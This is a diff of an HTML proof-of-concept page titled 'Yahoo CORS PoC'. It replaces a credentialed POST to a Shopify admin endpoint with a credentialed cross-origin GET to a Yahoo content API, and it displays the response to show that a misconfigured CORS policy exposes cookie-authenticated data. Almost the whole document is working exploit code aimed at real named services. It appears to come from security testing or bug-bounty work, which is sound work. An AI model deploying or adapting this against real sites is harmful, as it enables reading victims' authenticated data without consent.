@@ -1,16 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Yahoo CORS PoC</title>
+</head>
+<body>
+<h1>Exploiting Misconfigured CORS</h1>
+<pre id="output">Loading...</pre>
+
 <script>
-fetch("https://admin.shopify.com/.well-known/dux", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    events: [{ name: "exploit_attempt", timestamp: Date.now() }]
-  })
-})
-.then(res => res.text())
-.then(data => {
-  alert("Response: " + data);
-});
+(async () => {
+    try {
+        const res = await fetch(
+            "https://www.yahoo.com/caas/content/article/?uuid=a013139c-72da-3253-80a8-72aa5a4439be,7d6d7054-9b9b-3469-ab33-95ac7698d5e2,e8253ac8-e764-3eb5-aa19-a60a94dafb96&appid=news_web&device=desktop&lang=en-US&region=US&site=fp&partner=none&bucket=pushly-test-v2,seamless&features=enableEVPlayer,enableOverrideSpaceId,contentFeedbackEnabled,enableAdFeedbackV2,enableInArticleAd,enableOpinionLabel,enableSingleSlotting,enableVideoDocking,outStream,showCommentsIconWithDynamicCount,enableStickyAds,showCommentsIconInShareSec,enableGAMAdsOnLoad,enableFinancePremiumTicker,enableAdLiteUpSellFeedback,enableRRAtTop,enableCommentsCountInViewCommentsCta,enableRRAdsSlots,enableRRAdsSlotsWithJAC,newsModal,enableViewCommentsCTA,enableAdSlotsNewMap,enableGAMAds,enableAdSlotsFederationInBody,enableMidCenterAdOnViewer&rid=1hlkggtk9nf6g",
+            {
+                method: "GET",
+                credentials: "include" // sends cookies
+            }
+        );
+        const data = await res.text();
+        document.getElementById("output").textContent = data;
+    } catch (err) {
+        document.getElementById("output").textContent = "Error: " + err;
+    }
+})();
 </script>
+
+</body>
+</html>
